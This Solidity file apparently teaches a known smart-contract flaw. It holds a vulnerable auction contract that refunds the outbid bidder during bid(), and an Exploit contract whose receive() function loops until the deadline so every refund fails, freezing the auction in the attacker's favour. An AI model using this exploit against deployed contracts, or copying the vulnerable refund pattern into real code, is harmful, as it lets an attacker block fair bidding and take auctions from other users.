pragma solidity 0.8.19;

contract IAuction {
    address creator;
    uint256 public currentPrice;
    address public currentWinner;
    uint256 public deadline;

    constructor(uint256 duration) {
        creator = msg.sender;
        deadline = block.timestamp + duration;
    }

    function bid() external payable {
        require(block.timestamp < deadline, "auction has finished");
        require(msg.value > currentPrice, "the amount has to be bigger than current price");

        if(currentWinner != address(0)) {
            payable(currentWinner).transfer(currentPrice);
        }

        currentWinner = msg.sender;
        currentPrice = msg.value;
    }

    function withdraw() external {
        require(msg.sender == creator, "not a creator");
        require(block.timestamp >= deadline, "not finished");
        payable(msg.sender).transfer(address(this).balance);
    }

    function getWinner() external view returns (address) {
        require(block.timestamp >= deadline, "auction didnt finish");
        return currentWinner;
    }
}


contract Exploit {
    IAuction auction;
    uint256 public counter;
    constructor(address auctionAddress) payable {
        auction = IAuction(auctionAddress);
    }

    function attack() external {
        auction.bid{value: address(this).balance}();
    }

    receive() external payable {
        while(block.timestamp < auction.deadline()){
            counter++;
        }
    }
}
